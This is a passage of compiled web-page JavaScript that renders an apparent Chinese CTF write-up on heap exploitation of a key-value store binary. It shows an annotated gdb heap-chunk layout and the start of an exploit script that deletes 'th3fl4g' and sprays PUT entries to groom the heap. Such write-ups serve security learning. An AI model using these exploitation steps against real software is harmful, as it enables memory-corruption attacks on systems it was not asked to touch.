`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"80"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#A的size")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557580b0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#A data的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#这个是struct A节点")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758040"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"33"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"202020202020202"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"202020202020202"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"202020202020202"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"21")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#B节点的data")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758060"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"144680345676153346"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"33"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4242424242424242"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"21")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#B节点的key")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758080"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"33"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4141414141414141"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"91")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#A节点的key")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557580a0"),s("span",{style:{color:"#A6ACCD"}}," PREV_INUSE "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"145"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101010101010101"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101010101010101"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101010101010101"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101010101010101")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#A节点的data")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758130"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"65"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758070"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#B的key的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#B的大小")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758050"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#B的data")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758010"),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#存放A data的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#struct B节点")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758170"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"65"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557581c0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#C的key的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#C的size")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557581e0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#C的data的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#struct C节点")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557581b0"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"33"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4343434343434343"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"71")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#C的key")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557581d0"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"113"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"303030303030303"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"303030303030303"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"303030303030303"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"303030303030303")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#C的data")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758240"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"65"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758290"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#D的key的地址")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"f0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#D的size")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557582b0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#D的")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#struct D")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"555555758280"),s("span",{style:{color:"#A6ACCD"}}," FASTBIN "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"33"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"4444444444444444"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"101")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#D key")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557582a0"),s("span",{style:{color:"#A6ACCD"}}," PREV_INUSE "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"257"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"404040404040404"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"404040404040404"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"404040404040404"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"404040404040404")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#D data")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"5555557583a0"),s("span",{style:{color:"#A6ACCD"}}," PREV_INUSE "),s("span",{style:{color:"#89DDFF"}},"{")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  prev_size = "),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  size = "),s("span",{style:{color:"#F78C6C"}},"134241"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  fd_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#A6ACCD"}}," ")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#A6ACCD"}},"  bk_nextsize = "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"0")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#89DDFF"}},"}"),s("span",{style:{color:"#676E95","font-style":"italic"}},"#top chunk")])])])],-1),al=s("p",null,"这是正常分配的时候",-1),el=s("p",null,"如果原本的D去覆盖C，如下：(不知道为什么要这样，最开始以为是手误打错了，但是后来发现并不是手误！非常巧妙)",-1),tl=s("div",{class:"language-python"},[s("span",{class:"copy"}),s("pre",{class:"shiki material-theme-palenight"},[s("code",null,[s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"DEL"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"th3fl4g"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},")"),s("span",{style:{color:"#A6ACCD"}},"  "),s("span",{style:{color:"#676E95","font-style":"italic"}},"#delet th3fl4g")]),l(`
`),s("span",{class:"line"}),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"A"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"80"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"1"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"80"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"B"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"2"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"18"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
`),s("span",{class:"line"},[s("span",{style:{color:"#82AAFF"}},"PUT"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#C3E88D"}},"C"),s("span",{style:{color:"#89DDFF"}},'"'),s("span",{style:{color:"#89DDFF"}},"*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"8"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," "),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},","),s("span",{style:{color:"#82AAFF"}}," p8"),s("span",{style:{color:"#89DDFF"}},"("),s("span",{style:{color:"#F78C6C"}},"3"),s("span",{style:{color:"#89DDFF"}},")*"),s("span",{style:{color:"#C792EA"}},"0x"),s("span",{style:{color:"#F78C6C"}},"60"),s("span",{style:{color:"#89DDFF"}},")")]),l(`
